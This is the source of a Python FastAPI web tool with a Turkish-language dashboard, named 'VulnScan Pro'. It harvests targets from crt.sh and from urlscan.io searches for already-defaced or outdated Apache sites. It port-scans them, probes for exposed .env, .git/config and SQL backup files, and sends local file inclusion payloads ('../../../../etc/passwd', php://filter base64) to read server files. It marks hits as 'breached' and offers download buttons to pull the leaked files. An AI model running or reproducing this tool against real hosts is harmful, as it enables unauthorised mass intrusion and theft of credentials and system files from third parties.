from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
import random
import base64
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Pro - Dark Theme")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS findings 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      payload TEXT, extracted_data TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            "type": "log",
            "time": self.format(record).split('|')[0].strip(),
            "level": record.levelname,
            "message": self.format(record).split('|')[-1].strip()
        }
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET VE PAYLOAD LİSTELERİ ---
COMMON_DIRS = [
    "/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php", 
    "/.git/config", "/backup.sql", "/db.sql"
]
COMMON_PORTS = [21, 22, 80, 443, 3306, 8080]

LFI_PAYLOADS = [
    "../../../../etc/passwd", 
    "php://filter/convert.base64-encode/resource=config.php"
]

# --- ASENKRON VERİTABANI KAYDI ---
async def save_finding(url, vuln, payload, data):
    def db_insert():
        with get_db() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO findings (target_url, vuln_type, payload, extracted_data, timestamp) 
                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
            conn.commit()
    await asyncio.to_thread(db_insert)

# --- PORT TARAMA ---
async def scan_ports(ip, target_url, results):
    for port in COMMON_PORTS:
        try:
            fut = asyncio.open_connection(ip, port)
            reader, writer = await asyncio.wait_for(fut, timeout=2)
            writer.close()
            await writer.wait_closed()
            results.append({
                "type": "Port", 
                "path": f"Port {port}", 
                "url": target_url, 
                "status": 200
            })
        except:
            pass

# --- TARAMA MOTORU ---
async def scan_and_exploit(session, target_url, config):
    report = {"target": target_url, "vulns": [], "status": "OK"}
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    
    try:
        async with session.get(target_url, timeout=8, ssl=False, allow_redirects=True, headers=headers) as response:
            if response.status not in [200, 301, 302]:
                report["status"] = f"HTTP {response.status}"
                await manager.broadcast({"type": "scan_result", "data": report})
                return

            parsed_url = urllib.parse.urlparse(target_url)
            ip = parsed_url.hostname

            if config.get("ports") and ip:
                await scan_ports(ip, target_url, report["vulns"])

            if config.get("dirs"):
                for path in COMMON_DIRS:
                    test_url = f"{target_url.rstrip('/')}{path}"
                    try:
                        async with session.get(test_url, timeout=4, ssl=False, headers=headers) as res:
                            if res.status == 200:
                                if "admin" in path:
                                    v_type = "Admin Panel"
                                elif path.endswith(('.sql', '.env', '.zip')):
                                    v_type = "Kritik Dosya"
                                else:
                                    v_type = "Dizin"
                                
                                report["vulns"].append({
                                    "type": v_type, 
                                    "path": path, 
                                    "url": test_url, 
                                    "status": res.status
                                })
                    except: pass

            if config.get("lfi"):
                for payload in LFI_PAYLOADS:
                    test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                    try:
                        async with session.get(test_url, timeout=5, ssl=False, headers=headers) as res:
                            text = await res.text()
                            if "root:x:0:0" in text:
                                report["vulns"].append({
                                    "type": "LFI (Okundu)", 
                                    "path": "Sistem Dosyası", 
                                    "url": test_url, 
                                    "status": res.status
                                })
                                break
                            elif payload.startswith("php://") and len(text) > 20:
                                report["vulns"].append({
                                    "type": "LFI (Base64)", 
                                    "path": payload, 
                                    "url": test_url, 
                                    "status": res.status
                                })
                                break
                    except: pass

    except Exception:
        report["status"] = "ERROR"
        
    if report["vulns"]:
        report["status"] = "SIZILDI"
        
    await manager.broadcast({"type": "scan_result", "data": report})

# --- ARKA PLAN PİPELINE ---
async def run_scan_pipeline(config: dict):
    limit = config.get("limit", 50)
    threads = config.get("threads", 50)
    subdomain = config.get("subdomain", "")
    manual_urls = config.get("manual_urls", "")
    
    logger.info(f"Tarama Başlatıldı. Limit: {limit}")
    
    connector = aiohttp.TCPConnector(limit=threads, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        targets = set()
        
        if manual_urls:
            for url in manual_urls.split('\n'):
                url = url.strip()
                if url:
                    if not url.startswith("http"): url = "http://" + url
                    targets.add(url)
            logger.info(f"{len(targets)} manuel hedef eklendi.")
            
        if subdomain and len(targets) < limit:
            try:
                url = f"https://crt.sh/?q=%25.{subdomain}&output=json"
                async with session.get(url, timeout=15) as res:
                    if res.status == 200:
                        data = await res.json()
                        for entry in data:
                            name_value = entry.get('name_value', '')
                            for sub in name_value.split('\n'):
                                if sub and '*' not in sub:
                                    targets.add(f"http://{sub.strip()}")
            except Exception as e:
                logger.error(f"Subdomain Hatası: {e}")
                
        if len(targets) < limit:
            try:
                queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"']
                for q in queries:
                    if len(targets) >= limit: break
                    url = f"https://urlscan.io/api/v1/search/?q={urllib.parse.quote(q)}&size={limit}"
                    async with session.get(url, timeout=10) as res:
                        if res.status == 200:
                            data = await res.json()
                            for result in data.get('results', []):
                                page_url = result.get('page', {}).get('url')
                                if page_url and page_url.startswith("http"):
                                    targets.add(page_url)
            except Exception as e:
                logger.error(f"OSINT Hatası: {e}")
                
        targets = list(targets)[:limit]
        
        if not targets:
            logger.warning("Taranacak hedef bulunamadı.")
            return
            
        logger.info(f"Toplam {len(targets)} hedef taranıyor...")
        
        semaphore = asyncio.Semaphore(threads)
        async def limited_scan(url):
            async with semaphore:
                await scan_and_exploit(session, url, config)

        tasks = [limited_scan(url) for url in targets]
        await asyncio.gather(*tasks)
        
    logger.info("Tarama Tamamlandı.")

# --- API ENDPOINT'LERİ ---
class ScanConfig(BaseModel):
    limit: int
    threads: int
    subdomain: str
    manual_urls: str
    ports: bool
    dirs: bool
    lfi: bool

@app.post("/api/scan")
async def start_scan(config: ScanConfig, background_tasks: BackgroundTasks):
    background_tasks.add_task(run_scan_pipeline, config.dict())
    return {"status": "started"}

@app.get("/api/report")
async def get_report():
    with get_db() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM findings ORDER BY timestamp DESC")
        rows = c.fetchall()
        report = [{"id": r[0], "url": r[1], "type": r[2], "payload": r[3], "evidence": r[4], "date": r[5]} for r in rows]
    return JSONResponse(content={"report": report})

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan Pro</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #0f1115; --panel: #15181e; --border: #2a2e39;
                --text: #d1d5db; --text-light: #9ca3af;
                --primary: #3b82f6; --danger: #ef4444; --success: #10b981; --warning: #f59e0b;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
            
            /* Top Bar */
            .top-bar { background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
            .logo h1 { font-size: 1.25rem; font-weight: 700; color: #fff; }
            .logo span { color: var(--primary); }
            
            /* Control Panel */
            .control-panel { background: var(--panel); border-bottom: 1px solid var(--border); padding: 20px 30px; display: flex; gap: 20px; align-items: flex-end; flex-wrap: wrap; }
            .input-group { display: flex; flex-direction: column; gap: 6px; }
            .input-group label { font-size: 0.75rem; color: var(--text-light); font-weight: 600; text-transform: uppercase; }
            .input-group input, .input-group textarea { background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px 12px; border-radius: 6px; font-size: 0.9rem; outline: none; transition: 0.2s; }
            .input-group input:focus, .input-group textarea:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(59,130,246,0.1); }
            .input-group textarea { height: 42px; resize: vertical; }
            
            .toggle-group { display: flex; gap: 8px; }
            .toggle-btn { background: var(--bg); border: 1px solid var(--border); color: var(--text-light); padding: 10px 16px; border-radius: 6px; font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: 0.2s; user-select: none; }
            .toggle-btn.active { background: var(--primary); border-color: var(--primary); color: #fff; }
            
            .btn-start { background: var(--primary); color: #fff; border: none; padding: 0 25px; border-radius: 6px; font-weight: 600; font-size: 0.95rem; cursor: pointer; transition: 0.2s; height: 42px; }
            .btn-start:hover { background: #2563eb; }
            .btn-start:disabled { background: #374151; color: #9ca3af; cursor: not-allowed; }
            
            .btn-report { background: transparent; border: 1px solid var(--border); color: var(--text); padding: 0 15px; border-radius: 6px; font-weight: 600; font-size: 0.85rem; text-decoration: none; transition: 0.2s; height: 42px; display: flex; align-items: center; }
            .btn-report:hover { background: #1e2230; }

            /* Stats Bar */
            .stats-bar { display: flex; background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 30px; gap: 40px; }
            .stat-item { display: flex; flex-direction: column; }
            .stat-label { font-size: 0.75rem; color: var(--text-light); font-weight: 600; text-transform: uppercase; }
            .stat-value { font-size: 1.25rem; font-weight: 700; }
            .stat-value.scanned { color: var(--primary); }
            .stat-value.vuln { color: var(--danger); }
            .stat-value.clean { color: var(--success); }
            .stat-value.error { color: var(--warning); }

            /* Main Layout */
            .main-layout { display: flex; flex: 1; overflow: hidden; padding: 20px 30px; gap: 20px; }
            
            /* Terminal */
            .terminal-panel { width: 35%; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; display: flex; flex-direction: column; }
            .panel-header { padding: 12px 20px; border-bottom: 1px solid var(--border); font-size: 0.85rem; color: var(--text); font-weight: 600; display: flex; justify-content: space-between; background: #1a1e29; border-top-left-radius: 8px; border-top-right-radius: 8px; }
            .terminal { flex: 1; overflow-y: auto; padding: 15px 20px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; line-height: 1.6; background: #000; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; }
            .log-line { margin-bottom: 6px; display: flex; gap: 10px; }
            .log-time { color: var(--text-light); min-width: 65px; }
            .log-info { color: var(--primary); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }

            /* Results Table */
            .table-panel { width: 65%; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; display: flex; flex-direction: column; overflow: hidden; }
            .table-tools { padding: 12px 20px; border-bottom: 1px solid var(--border); display: flex; gap: 15px; background: #1a1e29; }
            .table-tools input { flex: 1; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px 15px; border-radius: 6px; font-size: 0.9rem; outline: none; transition: 0.2s; }
            .table-tools input:focus { border-color: var(--primary); }
            
            .table-container { flex: 1; overflow-y: auto; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 15px 20px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.9rem; vertical-align: middle; }
            th { background: #1a1e29; color: var(--text-light); font-weight: 600; position: sticky; top: 0; z-index: 10; }
            tr:hover { background: #1e2230; }
            
            .badge { padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; display: inline-block; }
            .badge-vuln { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
            .badge-clean { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.3); }
            .badge-err { background: rgba(245, 158, 11, 0.15); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
            
            .btn-detail { background: #1a1e29; color: var(--text); border: 1px solid var(--border); padding: 6px 12px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; cursor: pointer; transition: 0.2s; }
            .btn-detail:hover { background: #2a2e39; }
            
            /* Detay Satırı */
            .detail-row { display: none; background: #0f1115; }
            .detail-row td { padding: 15px 20px; border-bottom: 1px solid var(--border); }
            
            .vuln-item { display: flex; justify-content: space-between; align-items: center; background: var(--panel); padding: 10px 15px; border: 1px solid var(--border); border-radius: 6px; margin-bottom: 8px; }
            .vuln-info { display: flex; flex-direction: column; gap: 4px; }
            .vuln-type { font-weight: 600; font-size: 0.85rem; color: var(--text); }
            .vuln-path { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--text-light); word-break: break-all; }
            
            .vuln-actions { display: flex; gap: 8px; }
            .btn-action { padding: 6px 12px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; transition: 0.2s; border: none; }
            .btn-open { background: rgba(59, 130, 246, 0.15); color: var(--primary); }
            .btn-open:hover { background: rgba(59, 130, 246, 0.3); }
            .btn-download { background: rgba(16, 185, 129, 0.15); color: var(--success); }
            .btn-download:hover { background: rgba(16, 185, 129, 0.3); }
        </style>
    </head>
    <body>
        <div class="top-bar">
            <div class="logo">
                <h1>VulnScan <span>Pro</span></h1>
            </div>
        </div>

        <div class="control-panel">
            <div class="input-group">
                <label>Hedef Domain</label>
                <input type="text" id="subdomain" placeholder="example.com">
            </div>
            <div class="input-group" style="flex: 1;">
                <label>Manuel Hedefler (Alt Alta)</label>
                <textarea id="manual_urls" placeholder="http://hedef1.com&#10;http://hedef2.com"></textarea>
            </div>
            <div class="input-group" style="width: 90px;">
                <label>Limit</label>
                <input type="number" id="limit" value="50">
            </div>
            <div class="input-group" style="width: 90px;">
                <label>Thread</label>
                <input type="number" id="threads" value="50">
            </div>
            
            <div class="input-group">
                <label>Modüller</label>
                <div class="toggle-group">
                    <div class="toggle-btn active" id="mod-ports" onclick="toggleBtn(this)">Port</div>
                    <div class="toggle-btn active" id="mod-dirs" onclick="toggleBtn(this)">Dizin</div>
                    <div class="toggle-btn active" id="mod-lfi" onclick="toggleBtn(this)">LFI</div>
                </div>
            </div>

            <button class="btn-start" id="startBtn" onclick="startScan()">Taramayı Başlat</button>
            <a href="/api/report" target="_blank" class="btn-report">Rapor İndir</a>
        </div>

        <div class="stats-bar">
            <div class="stat-item">
                <span class="stat-label">Taranan</span>
                <span class="stat-value scanned" id="stat-scanned">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Açıklar Bulundu</span>
                <span class="stat-value vuln" id="stat-vuln">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Temiz</span>
                <span class="stat-value clean" id="stat-clean">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Hata</span>
                <span class="stat-value error" id="stat-error">0</span>
            </div>
        </div>

        <div class="main-layout">
            <div class="terminal-panel">
                <div class="panel-header">Konsol Çıktısı</div>
                <div id="terminal" class="terminal">
                    <div class="log-line"><span class="log-time">[SİSTEM]</span><span class="log-info">Arayüz hazır. Tarama bekleniyor...</span></div>
                </div>
            </div>
            
            <div class="table-panel">
                <div class="table-tools">
                    <input type="text" id="searchBar" placeholder="URL veya Zafiyet Ara..." onkeyup="filterTable()">
                </div>
                <div class="table-container">
                    <table id="resultsTable">
                        <thead>
                            <tr>
                                <th>Hedef URL</th>
                                <th>Durum</th>
                                <th>İşlem</th>
                            </tr>
                        </thead>
                        <tbody id="tableBody">
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');
            const tableBody = document.getElementById('tableBody');
            
            let stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === "log") {
                    const line = document.createElement("div");
                    line.className = "log-line";
                    let colorClass = "log-info";
                    if (data.level === "WARNING") colorClass = "log-warning";
                    if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";

                    line.innerHTML = `<span class="log-time">[${data.time}]</span><span class="${colorClass}">${data.message}</span>`;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                } 
                else if (data.type === "scan_result") {
                    stats.scanned++;
                    
                    const res = data.data;
                    let statusBadge = "";
                    let actionBtn = "";
                    
                    if (res.status === "SIZILDI") {
                        stats.vuln++;
                        statusBadge = `<span class="badge badge-vuln">Açıklar Bulundu</span>`;
                        actionBtn = `<button class="btn-detail" onclick="toggleDetail(this)">Detayları Gör</button>`;
                    } else if (res.status === "ERROR" || res.status.startsWith("HTTP")) {
                        stats.error++;
                        statusBadge = `<span class="badge badge-err">${res.status}</span>`;
                        actionBtn = `<span style="color:var(--text-light); font-size:0.8rem;">-</span>`;
                    } else {
                        stats.clean++;
                        statusBadge = `<span class="badge badge-clean">Temiz</span>`;
                        actionBtn = `<span style="color:var(--text-light); font-size:0.8rem;">-</span>`;
                    }

                    document.getElementById('stat-scanned').innerText = stats.scanned;
                    document.getElementById('stat-vuln').innerText = stats.vuln;
                    document.getElementById('stat-clean').innerText = stats.clean;
                    document.getElementById('stat-error').innerText = stats.error;

                    // Ana Satır
                    const tr = document.createElement("tr");
                    tr.setAttribute('data-search', (res.target + " " + res.status).toLowerCase());
                    tr.innerHTML = `
                        <td style="font-weight: 500; word-break:break-all;">${res.target}</td>
                        <td>${statusBadge}</td>
                        <td>${actionBtn}</td>
                    `;

                    // Detay Satırı (Gizli)
                    const detailTr = document.createElement("tr");
                    detailTr.className = "detail-row";
                    
                    if (res.vulns && res.vulns.length > 0) {
                        detailTr.innerHTML = `
                            <td colspan="3">
                                ${res.vulns.map(v => {
                                    let dlBtn = "";
                                    if (v.type !== "Port" && !v.type.includes("Admin")) {
                                        dlBtn = `<a href="${v.url}" download class="btn-action btn-download">İndir</a>`;
                                    }
                                    return `
                                        <div class="vuln-item">
                                            <div class="vuln-info">
                                                <span class="vuln-type">${v.type}</span>
                                                <span class="vuln-path">${v.path}</span>
                                            </div>
                                            <div class="vuln-actions">
                                                <a href="${v.url}" target="_blank" class="btn-action btn-open">Aç</a>
                                                ${dlBtn}
                                            </div>
                                        </div>
                                    `;
                                }).join('')}
                            </td>
                        `;
                    }

                    tableBody.insertBefore(tr, tableBody.firstChild);
                    tableBody.insertBefore(detailTr, tr.nextSibling);
                }
            };

            function toggleDetail(btn) {
                const tr = btn.closest('tr');
                const detailTr = tr.nextElementSibling;
                
                if (detailTr.style.display === "table-row") {
                    detailTr.style.display = "none";
                    btn.innerText = "Detayları Gör";
                } else {
                    detailTr.style.display = "table-row";
                    btn.innerText = "Gizle";
                }
            }

            function toggleBtn(btn) {
                btn.classList.toggle('active');
            }

            function filterTable() {
                const input = document.getElementById("searchBar");
                const filter = input.value.toLowerCase();
                const trs = document.getElementById("resultsTable").querySelectorAll("tbody tr:not(.detail-row)");

                trs.forEach(tr => {
                    const searchData = tr.getAttribute('data-search');
                    if (searchData && searchData.includes(filter)) {
                        tr.style.display = "";
                    } else {
                        tr.style.display = "none";
                        const detailTr = tr.nextElementSibling;
                        if (detailTr && detailTr.classList.contains('detail-row')) {
                            detailTr.style.display = "none";
                        }
                    }
                });
            }

            async function startScan() {
                const btn = document.getElementById('startBtn');
                btn.disabled = true;
                btn.innerText = "Taranıyor...";
                
                terminal.innerHTML = "";
                tableBody.innerHTML = "";
                stats = { scanned: 0, vuln: 0, clean: 0, error: 0 };
                document.getElementById('stat-scanned').innerText = 0;
                document.getElementById('stat-vuln').innerText = 0;
                document.getElementById('stat-clean').innerText = 0;
                document.getElementById('stat-error').innerText = 0;

                const config = {
                    limit: parseInt(document.getElementById('limit').value),
                    threads: parseInt(document.getElementById('threads').value),
                    subdomain: document.getElementById('subdomain').value.trim(),
                    manual_urls: document.getElementById('manual_urls').value.trim(),
                    ports: document.getElementById('mod-ports').classList.contains('active'),
                    dirs: document.getElementById('mod-dirs').classList.contains('active'),
                    lfi: document.getElementById('mod-lfi').classList.contains('active')
                };

                try {
                    await fetch('/api/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(config)
                    });
                } catch (error) {
                    console.error("API Hatası:", error);
                } finally {
                    btn.disabled = false;
                    btn.innerText = "Taramayı Başlat";
                }
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
